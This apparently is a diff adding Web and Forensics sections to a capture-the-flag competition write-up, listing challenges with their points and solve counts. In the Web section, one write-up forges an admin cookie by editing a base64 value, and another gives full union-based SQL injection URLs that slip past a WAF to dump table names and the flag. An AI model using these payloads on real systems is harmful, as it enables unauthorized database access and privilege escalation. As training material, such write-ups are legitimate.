@@ -44,3 +44,62 @@
 
 > ### Crack Me [400pt, 0/12 Solves]
 > Finding the passcode that can pass the authentication of auth.bin.
+
+## Web
+> ### Client is not secure [50pt, 11/12 Solves]
+> Can you help me to find my password? http://47.56.165.70:25241/login.php
+
+> ### Admin Access [125pt, 11/12 Solves]
+> I got a non-admin account (username is user, password is 1234) for this website: http://47.56.165.70:32954/login.php. But I need an admin user. How should I do?
+>
+> #### Idea
+> - Cookie include sensitive parameters 
+> - Base64 encode in Token
+>
+> #### Writeup
+> Using the crediential of non-admin account willl received a cookie auth which is base64 encoded. After base64 decode the auth cookie: 'user = "user"; password = "1234"; admin = FALSE'. We set admin=TRUE then re-encoded it, we got 'dXNlciA9ICJ1c2VyIjsgcGFzc3dvcmQgPSAiMTIzNCI7IGFkbWluID0gVFJVRQ=='. Modify the cookie. Reload it then the flag is shown.
+
+> ### Only Web? No [300pt, 11/12 Solves]
+>Do you want to read some Book?
+>Please access it on http://13.251.58.69:8004
+>
+> #### Idea
+>
+> ### Unbreakable WAF [400pt, 1/12 Solves]
+> Is this really an unbreakable Cloud WAF? Please access http://47.56.124.67/.
+>
+> #### Tags
+> **base64_encode**, **WAF**, **PHP**, **SQLi**
+>
+> #### Idea 
+> - With thanks to [Blackbox](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#blackbox)
+> - Bypass WAF by incorrect usage of BASE64 and URLENCODE
+> - SQL Injection with `union` select
+>
+> #### Writeup
+> The PHP pass our parameters 'username' to the function base64_encode() before sending to the Orange WAF. The WAF is not allow us to send the symbol like ' and " or even space. After Google, we found the Blackbox writeup, so we tried with three queries which all starct with `~~~~` :
+> - To view current database: `http://47.56.124.67/?username=orange~~~~' or '1' = '1' union select database() union select '12' from users where '1' = '1
+http://47.56.124.67/?username=orange~~~~' or '1' = '1' union select table_name from INFORMATION_SCHEMA.tables union select '12' from users where '1' = '1`
+> - To find the column name: `http://47.56.124.67/?username=orange~~~~' or '1' = '1' union select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS union select '12' from users where '1' = '1`
+> - To find the flag: `http://47.56.124.67/?username=orange~~~~' or '1' = '1' union select FLAG from flag union select '12' from users where '1' = '1`
+
+## Forensics
+> ### Good Image [50pt, 11/12 Solves]
+> Can you help us find the flag in this image?
+
+> ### Simple Forensics [50pt, 11/12 Solves]
+> Can you find the flag in this file?
+
+> ### Simple Forensics 2 [50pt, 11/12 Solves]
+> Can you find the flag in this file?
+
+> ### Broken string [125pt, 3/12 Solves]
+> My secret string was broken because of fire. Can you help to decode?
+
+> ### Secret Image 1 [125pt, 1/12 Solves]
+> Can you find the flag encoded inside the image?
+
+> ### Secret Image 2 [350pt, 0/12 Solves]
+> Can you find the flag encoded inside the image?
+
+
